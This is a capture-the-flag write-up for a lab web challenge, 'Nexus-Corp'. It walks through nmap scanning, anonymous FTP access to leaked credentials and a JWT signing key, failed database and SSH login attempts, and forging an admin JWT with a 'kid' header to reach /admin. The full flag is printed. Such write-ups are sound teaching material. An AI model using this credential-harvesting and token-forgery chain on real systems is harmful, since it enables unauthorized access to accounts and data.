+++
title = 'Nexus-Corp'
description = "You've gained a foothold on Nexus Corp's internal network. Enumerate the host and get access to the `/admin` endpoint where the flag resides."
category = 'Web'
solved = true
+++

| Info        	|                                        	|
|-------------	|----------------------------------------	|
| Category    	| {{< param category >}}                 	|
| Description 	| {{< desc >}}                           	|
| Endpoint    	| Provided by the platform, port `3000`    	|
| Flag        	| `HFCTF{spr4y_1d0r_f0rg3ry_fu1l_chain}` 	|

> [!CAUTION] TL;DR
> The dashboard is accessible with a guessable cookie name, trusts a client-forged JWT’s role claim, and the key-rotation scheme accepts a `kid` header pointing at an old, leaked signing key.
Any forged token can sign in as admin.

## Summary

Looking at the webpage, I was met with a login page and no information about any user.
Following the description of the challenge, I enumerated the host and found an FTP service where I could get files about employees and details about the JWTs used on the site.
Forging a new token I logged in and found a dashboard page with javascript code to read the token.
I modified the token further and logged in as the admin, giving access to the admin page and the flag.

## First Look

First things first, trying the `/admin` endpoint returned a `401 Unauthorized`.
The given endpoint returned a login page with nothing interesting in the source code.
So I followed the advice of the description.

## Recon

First, I enumerated the host to see what I was dealing with.

### Enumeration

A simple `nmap` on the endpoint gave
```console
$ nmap TARGET_IP
...
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
443/tcp   closed https
2222/tcp  open   EtherNetIP-1
3000/tcp  open   ppp
8080/tcp  open   http-proxy
30000/tcp closed ndmps
```

> [!NOTE]
> The port `8080` was used by another challenge, so nothing there for this one.

Obviously, the port `3000` is a web server, since I had accessed it earlier.
But I wanted to know if maybe the vulnerability was in the specific service used.

```console
$ nmap -sV -sC -p 3000 TARGET_IP
...
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Nexus Corp - Login
```
### FTP
The FTP server was also intriguing.
Maybe it was left as `anonymous`, so I connected to it with a simple `ftp TARGET_IP` and believe it or not, the `anonymous` user was working.
On the server were 4 files about IT and Onboarding, so I downloaded them all to look at them.

#### IT

- File `dev-todo.txt`:
```text { hl_lines=[4,5,7,8] }
IT Development Team - TODO List
================================
...
[X] Migrate JWT signing to file-based key system
[X] Update API endpoints to use kid header

[!!!] URGENT: Delete /app/jwt-keys/old
    - This file contains the OLD JWT signing key: n3xus_c0rp_s3cr3t_k3y_2024!
...   
```

- File `IT-Config-Backup.json`:
```json { hl_lines=["4-8",12,17] }
{
  ...
  "database": {
    "host": "localhost",
    "port": 5432,
    "name": "hr_portal",
    "user": "hr_admin",
    "password": "Hr@dm1n2024!"
  },
  "jwt": {
    "expires_in": "24h",
    "algorithm": "HS256",
	"key_rotation_enabled": true,
    "key_file": "/app/jwt-keys/current"
  },
  "session": {
    "cookie_name": "nexus_session",
    "secure": false,
    "http_only": false
  },
  ...
}
```

#### Onboarding

- File `HR-Employee-List.csv`:
```csv { hl_lines=[2] }
employee_id,first_name,last_name,department,role,email
1001,Admin,User,IT,admin,admin@nexuscorp.local
1002,James,Mitchell,Executive,employee,james.mitchell@nexuscorp.local
1003,Sarah,Johnson,HR,employee,sarah.johnson@nexuscorp.local
...
```

- File `IT-Onboarding-Guide.txt`:
```text { hl_lines=[4,10,11] }
Nexus Corp - IT Onboarding Guide
=================================
...  
   Username format: first initial + last name (all lowercase)
   Examples:
     - John Smith    → jsmith
     - Sarah Johnson → sjohnson
...
2. DEFAULT PASSWORD
   All new accounts are created with the default password:
   Nexus$2024!
...
```

## Dead Ends

With some credentials and open ports in hand, I tried three routes that failed.
Here's why.

### PostgreSQL
The first thing that jumped to my mind was the database mentioned in lines 4-8 of the backup `json` file.
The port `5432` is usually reserved for PostgreSQL, so I confirmed it quickly.

```console
$ nmap -sV -sC -p 5432 TARGET_IP
...
PORT     STATE    SERVICE    VERSION
5432/tcp filtered postgresql
```

As clearly indicated by the backup file and hinted by the `filtered` state of the port, the database was only accessible locally.
I realized this after running 
```console
$ psql -h TARGET_IP -p 5432 -U hr_admin -d hr_portal -W
```
to try to connect to the database with no success.

### SSH 
Maybe I could try to connect using SSH to the machine and find more info about the flag.
After all, there was at least one SSH port open. 

```console
$ ssh TARGET_IP                       
...
kali@TARGET_IP: Permission denied (publickey).
```

The opened port `22` needed a public key, so no chance of connection there. 
There was another SSH port opened on the machine, though.
Being curious of what `EtherNetIP-1` is supposed to be, I scanned the port `2222`, and obviously it was just another SSH service.

```console
$ nmap -sV -sC -p 2222 TARGET_IP
...
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ... (ECDSA)
|_  256 ... (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This one required a password and not a public key, but after trying the passwords found in the backup on line 8 and onboarding guide on line 11 combined with the username format of line 4 and the list of employees, I had no success.

> [!NOTE]
> I did also try to just connect to the login page using the username format and default password, to no success here either.

## Solution

1. **Forge a session cookie** to reach `/dashboard`.

    I added the cookie from line 17 of the backup file to value `admin` to try and maybe get a valid connection.

2. **Read the dashboard's javascript.**

    ```html { hl_lines=["5-9","14-16",19,25,26] }
    <script>
            async function loadProfile() {
                const cookies = ...

                const token = cookies.nexus_session;
                if (!token) {
                    window.location.href = '/';
                    return;
                }

                try {
                    const payload = ...

                    if (payload.role === 'admin') {
                        document.getElementById('admin-link').style.display = 'inline';
                    }

                    // Fetch our profile
                    const res = await fetch(`/api/employee/${payload.employee_id}`);
                    ...
                } ...
            }
            ...
            async function viewProfile(id) {
                // VULN: IDOR - player can modify this ID in DevTools/intercept
                const res = await fetch(`/api/employee/${id}`);
                ...
            }
            ...
        </script>
    ```

    It seems from line 12 that having any value in the `nexus_session` cookie would let us access the dashboard page.
    However, the rest of the dashboard was empty due to not having a valid `employee_id` to fetch the correct information (line 19).

    > [!warning]- Dead End
    > The comment on line 25 was another detour.
    > Being able to access the employee by altering the ID in the network tab and resending the request would reveal nothing useful that I did not already have in the files found in the FTP dump.

3. **Forge a JWT** with `alg: HS256`, `role: admin`, `employee_id: 1001`, signed with the leaked key from the FTP dump.

    ```json
    {
      "alg": "HS256",
      "typ": "JWT",
    }
    {
      "role": "admin",
      "employee_id": 1001,
    }
    n3xus_c0rp_s3cr3t_k3y_2024!
    ```
    The token uses the `employee_id` of the admin found in the `csv` file to try and connect as a valid admin.

4. **First attempt fails.**
    
    The token was rejected.
    What I had missed was line 4 and 5 of the `todo` file: the token needed the `kid` header.

    > [!TIP]- The `kid` Header
    > Since the JWT signing was moved to a file-based key system as mentioned on line 4, it meant that the token needed to mention which key was used.
    > The server had now an old signing key from line 7 and 8 of the `todo` file, and a new one mentioned on line 14 of the backup file.
    >
    > The [`kid` header](https://www.rfc-editor.org/info/rfc7515/#section-4.1.4) is an optional header used to indicate which key was used when signing the token.

5. **Add `kid: old`** to the token header and resign.

    ```json
    {
      "alg": "HS256",
      "typ": "JWT",
      "kid": "old",
    }
    {
      "role": "admin",
      "employee_id": 1001,
    }
    n3xus_c0rp_s3cr3t_k3y_2024!
    ```

6. **Visit `/admin`** from the link added with line 14 to 16 of the javascript code on the dashboard
    
    This returned the flag on the `/admin` page.
